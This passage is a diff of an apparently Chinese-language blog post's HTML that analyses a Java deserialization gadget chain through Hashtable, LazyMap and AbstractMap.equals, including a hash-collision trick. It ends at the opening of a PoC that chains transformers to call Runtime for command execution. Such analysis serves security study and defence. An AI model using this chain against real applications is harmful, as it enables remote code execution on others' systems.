-    <span style="color:#66d9ef">int</span> index <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>hash <span style="color:#f92672">&amp;</span> 0x7FFFFFFF<span style="color:#f92672">)</span> <span style="color:#f92672">%</span> tab<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">;</span>
-    <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>Entry<span style="color:#f92672">&lt;</span>K<span style="color:#f92672">,</span>V<span style="color:#f92672">&gt;</span> e <span style="color:#f92672">=</span> tab<span style="color:#f92672">[</span>index<span style="color:#f92672">]</span> <span style="color:#f92672">;</span> e <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">;</span> e <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span><span style="color:#a6e22e">next</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        <span style="color:#66d9ef">if</span> <span style="color:#f92672">((</span>e<span style="color:#f92672">.</span><span style="color:#a6e22e">hash</span> <span style="color:#f92672">==</span> hash<span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> e<span style="color:#f92672">.</span><span style="color:#a6e22e">key</span><span style="color:#f92672">.</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span>key<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
-            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">StreamCorruptedException</span><span style="color:#f92672">();</span>
-        <span style="color:#f92672">}</span>
-    <span style="color:#f92672">}</span>
-    <span style="color:#75715e">// Creates the new entry.
-</span><span style="color:#75715e"></span>    Entry<span style="color:#f92672">&lt;</span>K<span style="color:#f92672">,</span>V<span style="color:#f92672">&gt;</span> e <span style="color:#f92672">=</span> tab<span style="color:#f92672">[</span>index<span style="color:#f92672">];</span>
-    tab<span style="color:#f92672">[</span>index<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Entry<span style="color:#f92672">&lt;&gt;(</span>hash<span style="color:#f92672">,</span> key<span style="color:#f92672">,</span> value<span style="color:#f92672">,</span> e<span style="color:#f92672">);</span>
-    count<span style="color:#f92672">++;</span>
-<span style="color:#f92672">}</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>reconstitutionPut</span><span style=color:#f92672>(</span>Entry<span style=color:#f92672>&lt;</span>K<span style=color:#f92672>,</span>V<span style=color:#f92672>&gt;[]</span> tab<span style=color:#f92672>,</span> K key<span style=color:#f92672>,</span> V value<span style=color:#f92672>)</span>
+    <span style=color:#66d9ef>throws</span> StreamCorruptedException
+<span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>value <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>.</span><span style=color:#a6e22e>StreamCorruptedException</span><span style=color:#f92672>();</span>
+    <span style=color:#f92672>}</span>
+    <span style=color:#75715e>// Makes sure the key is not already in the hashtable.
+</span><span style=color:#75715e></span>    <span style=color:#75715e>// This should not happen in deserialized version.
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>int</span> hash <span style=color:#f92672>=</span> hash<span style=color:#f92672>(</span>key<span style=color:#f92672>);</span>
+    <span style=color:#66d9ef>int</span> index <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>hash <span style=color:#f92672>&amp;</span> 0x7FFFFFFF<span style=color:#f92672>)</span> <span style=color:#f92672>%</span> tab<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>;</span>
+    <span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span>Entry<span style=color:#f92672>&lt;</span>K<span style=color:#f92672>,</span>V<span style=color:#f92672>&gt;</span> e <span style=color:#f92672>=</span> tab<span style=color:#f92672>[</span>index<span style=color:#f92672>]</span> <span style=color:#f92672>;</span> e <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>;</span> e <span style=color:#f92672>=</span> e<span style=color:#f92672>.</span><span style=color:#a6e22e>next</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>((</span>e<span style=color:#f92672>.</span><span style=color:#a6e22e>hash</span> <span style=color:#f92672>==</span> hash<span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> e<span style=color:#f92672>.</span><span style=color:#a6e22e>key</span><span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>key<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>.</span><span style=color:#a6e22e>StreamCorruptedException</span><span style=color:#f92672>();</span>
+        <span style=color:#f92672>}</span>
+    <span style=color:#f92672>}</span>
+    <span style=color:#75715e>// Creates the new entry.
+</span><span style=color:#75715e></span>    Entry<span style=color:#f92672>&lt;</span>K<span style=color:#f92672>,</span>V<span style=color:#f92672>&gt;</span> e <span style=color:#f92672>=</span> tab<span style=color:#f92672>[</span>index<span style=color:#f92672>];</span>
+    tab<span style=color:#f92672>[</span>index<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Entry<span style=color:#f92672>&lt;&gt;(</span>hash<span style=color:#f92672>,</span> key<span style=color:#f92672>,</span> value<span style=color:#f92672>,</span> e<span style=color:#f92672>);</span>
+    count<span style=color:#f92672>++;</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>可以看到这里会调用e.key.equals(key) 方法，只要保证外部的key是Map对象并且可以调用AbstractMap#equals，并且参数的key是lazyMap，就可以达到目的。这两个key是否可控呢？继续看源码可以知道，reconstitutionPut是由readObject方法调用的：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span><span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ObjectInputStream</span> s<span style="color:#f92672">)</span>
-     <span style="color:#66d9ef">throws</span> IOException<span style="color:#f92672">,</span> ClassNotFoundException
-<span style="color:#f92672">{</span>
-    <span style="color:#75715e">// Read in the length, threshold, and loadfactor
-</span><span style="color:#75715e"></span>    s<span style="color:#f92672">.</span><span style="color:#a6e22e">defaultReadObject</span><span style="color:#f92672">();</span>
-		<span style="color:#f92672">...</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>readObject</span><span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ObjectInputStream</span> s<span style=color:#f92672>)</span>
+     <span style=color:#66d9ef>throws</span> IOException<span style=color:#f92672>,</span> ClassNotFoundException
+<span style=color:#f92672>{</span>
+    <span style=color:#75715e>// Read in the length, threshold, and loadfactor
+</span><span style=color:#75715e></span>    s<span style=color:#f92672>.</span><span style=color:#a6e22e>defaultReadObject</span><span style=color:#f92672>();</span>
+		<span style=color:#f92672>...</span>
 
-    <span style="color:#75715e">// Read the number of elements and then all the key/value objects
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> <span style="color:#f92672">(;</span> elements <span style="color:#f92672">&gt;</span> 0<span style="color:#f92672">;</span> elements<span style="color:#f92672">--)</span> <span style="color:#f92672">{</span>
-        K key <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>K<span style="color:#f92672">)</span>s<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">();</span>
-        V value <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>V<span style="color:#f92672">)</span>s<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">();</span>
-        <span style="color:#75715e">// synch could be eliminated for performance
-</span><span style="color:#75715e"></span>        reconstitutionPut<span style="color:#f92672">(</span>newTable<span style="color:#f92672">,</span> key<span style="color:#f92672">,</span> value<span style="color:#f92672">);</span>
-    <span style="color:#f92672">}</span>
-    <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">table</span> <span style="color:#f92672">=</span> newTable<span style="color:#f92672">;</span>
-<span style="color:#f92672">}</span>
+    <span style=color:#75715e>// Read the number of elements and then all the key/value objects
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>for</span> <span style=color:#f92672>(;</span> elements <span style=color:#f92672>&gt;</span> 0<span style=color:#f92672>;</span> elements<span style=color:#f92672>--)</span> <span style=color:#f92672>{</span>
+        K key <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>K<span style=color:#f92672>)</span>s<span style=color:#f92672>.</span><span style=color:#a6e22e>readObject</span><span style=color:#f92672>();</span>
+        V value <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>V<span style=color:#f92672>)</span>s<span style=color:#f92672>.</span><span style=color:#a6e22e>readObject</span><span style=color:#f92672>();</span>
+        <span style=color:#75715e>// synch could be eliminated for performance
+</span><span style=color:#75715e></span>        reconstitutionPut<span style=color:#f92672>(</span>newTable<span style=color:#f92672>,</span> key<span style=color:#f92672>,</span> value<span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span>
+    <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>table</span> <span style=color:#f92672>=</span> newTable<span style=color:#f92672>;</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>同样的参考writeObject就可以知道，这里的key就是hashtable存储的key，所以也就可以直接将构造好的Map直接添加进去。所以需要想办法设置第二个参数为LazyMap（因为hashtable，所以并不是第二个传进去的一定会排在后面）。有意思的是，如果查看LazyMap，会发现其并没有自己实现equals方法，而是继承了AbstractMapDecorator的equals方法，而这个equals方法会调用一个map.equals方法：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span>Object object<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>object <span style="color:#f92672">==</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">;</span>
-    <span style="color:#f92672">}</span>
-    <span style="color:#66d9ef">return</span> map<span style="color:#f92672">.</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span>object<span style="color:#f92672">);</span>
-<span style="color:#f92672">}</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>Object object<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>object <span style=color:#f92672>==</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span><span style=color:#f92672>;</span>
+    <span style=color:#f92672>}</span>
+    <span style=color:#66d9ef>return</span> map<span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>object<span style=color:#f92672>);</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>而这个map则是来源于LazyMap构造时传入的HashMap：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">protected</span> <span style="color:#a6e22e">LazyMap</span><span style="color:#f92672">(</span>Map map<span style="color:#f92672">,</span> Transformer factory<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-    <span style="color:#66d9ef">super</span><span style="color:#f92672">(</span>map<span style="color:#f92672">);</span>
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>factory <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Factory must not be null&#34;</span><span style="color:#f92672">);</span>
-    <span style="color:#f92672">}</span>
-    <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">factory</span> <span style="color:#f92672">=</span> factory<span style="color:#f92672">;</span>
-<span style="color:#f92672">}</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>protected</span> <span style=color:#a6e22e>LazyMap</span><span style=color:#f92672>(</span>Map map<span style=color:#f92672>,</span> Transformer factory<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>super</span><span style=color:#f92672>(</span>map<span style=color:#f92672>);</span>
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>factory <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Factory must not be null&#34;</span><span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span>
+    <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>factory</span> <span style=color:#f92672>=</span> factory<span style=color:#f92672>;</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>而HashMap则是继承于AbstractMap，且没有自己实现equals，所以由HashMap构造的LazyMap就可以调用AbstractMap.equals方法，所以这里也就不用想太多了，直接将两个键值都设置为LazyMap，就不用考虑顺序了。</p>
 <p>现在就算是清楚了这条链的调用过程：</p>
 <ol>
@@ -549,114 +529,97 @@ s<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObject</sp
 </ol>
 <p>虽然清楚了这条链，但是这里还有另外一些问题，就是如何保证能够触发 e.key.equals(key)。</p>
 <p>再看看这条链几个关键的触发点，首先是readObject中的reconstitutionPut，这里就不用说太多，每个键值对会触发一次；然后是reconstitutionPut：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>Entry<span style="color:#f92672">&lt;</span>K<span style="color:#f92672">,</span>V<span style="color:#f92672">&gt;</span> e <span style="color:#f92672">=</span> tab<span style="color:#f92672">[</span>index<span style="color:#f92672">]</span> <span style="color:#f92672">;</span> e <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">;</span> e <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span><span style="color:#a6e22e">next</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">((</span>e<span style="color:#f92672">.</span><span style="color:#a6e22e">hash</span> <span style="color:#f92672">==</span> hash<span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> e<span style="color:#f92672">.</span><span style="color:#a6e22e">key</span><span style="color:#f92672">.</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span>key<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
-        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">StreamCorruptedException</span><span style="color:#f92672">();</span>
-    <span style="color:#f92672">}</span>
-<span style="color:#f92672">}</span>
-</code></pre></div><p>这里会首先从tab中读取到一个元素，判断其不为null的时候才会执行；这里的含义就是只有当大于一个元素的时候才会比较，所以HashTable至少需要两个元素；继续往下看在 e.key.equals(key) 还有一个判断e.hash== hash，也就是两个map的hash是否相同，只有相同的时候才能满足条件。这里就需要设计一下了，这里有一个trick，ysoserial在设计这里是两个LazyMap存储的键值分别为&quot;yy&quot;=1和&quot;zZ&quot;=1，这样子就能实现两个map的hash相同，其实原理很简单，稍微跟踪一下就能明白：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span>Entry<span style=color:#f92672>&lt;</span>K<span style=color:#f92672>,</span>V<span style=color:#f92672>&gt;</span> e <span style=color:#f92672>=</span> tab<span style=color:#f92672>[</span>index<span style=color:#f92672>]</span> <span style=color:#f92672>;</span> e <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>;</span> e <span style=color:#f92672>=</span> e<span style=color:#f92672>.</span><span style=color:#a6e22e>next</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>((</span>e<span style=color:#f92672>.</span><span style=color:#a6e22e>hash</span> <span style=color:#f92672>==</span> hash<span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> e<span style=color:#f92672>.</span><span style=color:#a6e22e>key</span><span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>key<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>.</span><span style=color:#a6e22e>StreamCorruptedException</span><span style=color:#f92672>();</span>
+    <span style=color:#f92672>}</span>
+<span style=color:#f92672>}</span>
+</code></pre></div><p>这里会首先从tab中读取到一个元素，判断其不为null的时候才会执行；这里的含义就是只有当大于一个元素的时候才会比较，所以HashTable至少需要两个元素；继续往下看在 e.key.equals(key) 还有一个判断e.hash== hash，也就是两个map的hash是否相同，只有相同的时候才能满足条件。这里就需要设计一下了，这里有一个trick，ysoserial在设计这里是两个LazyMap存储的键值分别为"yy"=1和"zZ"=1，这样子就能实现两个map的hash相同，其实原理很简单，稍微跟踪一下就能明白：</p>
 <p>在reconstitutionPut中，hash是又hash(Object k)实现的：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hash</span><span style="color:#f92672">(</span>Object k<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-    <span style="color:#75715e">// hashSeed will be zero if alternative hashing is disabled.
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> hashSeed <span style="color:#f92672">^</span> k<span style="color:#f92672">.</span><span style="color:#a6e22e">hashCode</span><span style="color:#f92672">();</span>
-<span style="color:#f92672">}</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>hash</span><span style=color:#f92672>(</span>Object k<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+    <span style=color:#75715e>// hashSeed will be zero if alternative hashing is disabled.
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>return</span> hashSeed <span style=color:#f92672>^</span> k<span style=color:#f92672>.</span><span style=color:#a6e22e>hashCode</span><span style=color:#f92672>();</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>hashSeed是相同的，所以hash值取决于 k.hashCode()，这里的k是LazyMap，所以查看LazyMap的hashCode方法；而LazyMap没有实现hashCode()，所以查看其父类AbstractMapDecorator的hashCode()方法：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
-    <span style="color:#66d9ef">return</span> map<span style="color:#f92672">.</span><span style="color:#a6e22e">hashCode</span><span style="color:#f92672">();</span>
-<span style="color:#f92672">}</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>hashCode</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>return</span> map<span style=color:#f92672>.</span><span style=color:#a6e22e>hashCode</span><span style=color:#f92672>();</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>直接调用了map.hashCode()，也就是HashMap.hashCode()：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
-    <span style="color:#66d9ef">return</span> Objects<span style="color:#f92672">.</span><span style="color:#a6e22e">hashCode</span><span style="color:#f92672">(</span>getKey<span style="color:#f92672">())</span> <span style="color:#f92672">^</span> Objects<span style="color:#f92672">.</span><span style="color:#a6e22e">hashCode</span><span style="color:#f92672">(</span>getValue<span style="color:#f92672">());</span>
-<span style="color:#f92672">}</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>hashCode</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>return</span> Objects<span style=color:#f92672>.</span><span style=color:#a6e22e>hashCode</span><span style=color:#f92672>(</span>getKey<span style=color:#f92672>())</span> <span style=color:#f92672>^</span> Objects<span style=color:#f92672>.</span><span style=color:#a6e22e>hashCode</span><span style=color:#f92672>(</span>getValue<span style=color:#f92672>());</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>也就是分别对键和值进行Objects.hashCode，value可以相同就不用过多考虑了，只需要想办法使Objects.hashCode(getKey())相同就可以了：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span><span style="color:#f92672">(</span>Object o<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-    <span style="color:#66d9ef">return</span> o <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> o<span style="color:#f92672">.</span><span style="color:#a6e22e">hashCode</span><span style="color:#f92672">()</span> <span style="color:#f92672">:</span> 0<span style="color:#f92672">;</span>
-<span style="color:#f92672">}</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>hashCode</span><span style=color:#f92672>(</span>Object o<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>return</span> o <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>?</span> o<span style=color:#f92672>.</span><span style=color:#a6e22e>hashCode</span><span style=color:#f92672>()</span> <span style=color:#f92672>:</span> 0<span style=color:#f92672>;</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>也就是说，这里会调用key.hashCode()，这里设置的key是String，看一下String.hashCode()：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hashCode</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
-    <span style="color:#66d9ef">int</span> h <span style="color:#f92672">=</span> hash<span style="color:#f92672">;</span>
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>h <span style="color:#f92672">==</span> 0 <span style="color:#f92672">&amp;&amp;</span> value<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        <span style="color:#66d9ef">char</span> val<span style="color:#f92672">[]</span> <span style="color:#f92672">=</span> value<span style="color:#f92672">;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>hashCode</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>int</span> h <span style=color:#f92672>=</span> hash<span style=color:#f92672>;</span>
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>h <span style=color:#f92672>==</span> 0 <span style=color:#f92672>&amp;&amp;</span> value<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span> <span style=color:#f92672>&gt;</span> 0<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>char</span> val<span style=color:#f92672>[]</span> <span style=color:#f92672>=</span> value<span style=color:#f92672>;</span>
 
-        <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0<span style="color:#f92672">;</span> i <span style="color:#f92672">&lt;</span> value<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">;</span> i<span style="color:#f92672">++)</span> <span style="color:#f92672">{</span>
-            h <span style="color:#f92672">=</span> 31 <span style="color:#f92672">*</span> h <span style="color:#f92672">+</span> val<span style="color:#f92672">[</span>i<span style="color:#f92672">];</span>
-        <span style="color:#f92672">}</span>
-        hash <span style="color:#f92672">=</span> h<span style="color:#f92672">;</span>
-    <span style="color:#f92672">}</span>
-    <span style="color:#66d9ef">return</span> h<span style="color:#f92672">;</span>
-<span style="color:#f92672">}</span>
+        <span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> 0<span style=color:#f92672>;</span> i <span style=color:#f92672>&lt;</span> value<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>;</span> i<span style=color:#f92672>++)</span> <span style=color:#f92672>{</span>
+            h <span style=color:#f92672>=</span> 31 <span style=color:#f92672>*</span> h <span style=color:#f92672>+</span> val<span style=color:#f92672>[</span>i<span style=color:#f92672>];</span>
+        <span style=color:#f92672>}</span>
+        hash <span style=color:#f92672>=</span> h<span style=color:#f92672>;</span>
+    <span style=color:#f92672>}</span>
+    <span style=color:#66d9ef>return</span> h<span style=color:#f92672>;</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>这里其实就很简单了，只要使两个字符串满足计算结果相同就行，这里的yy和zZ就是，同样的换成yx和zY也行。</p>
 <p>其他的条件就比较简单了，上面的设计好就可以满足了。</p>
 <p>然后就可以写出PoC了：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">getObject</span><span style="color:#f92672">(</span><span style="color:#66d9ef">final</span> String commands<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
-    <span style="color:#75715e">// Init the transformer to exec commands.
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">final</span> Transformer transformerChain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer<span style="color:#f92672">(</span>
-            <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]{</span>
-                    <span style="color:#66d9ef">new</span> ConstantTransformer<span style="color:#f92672">(</span>Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">),</span>
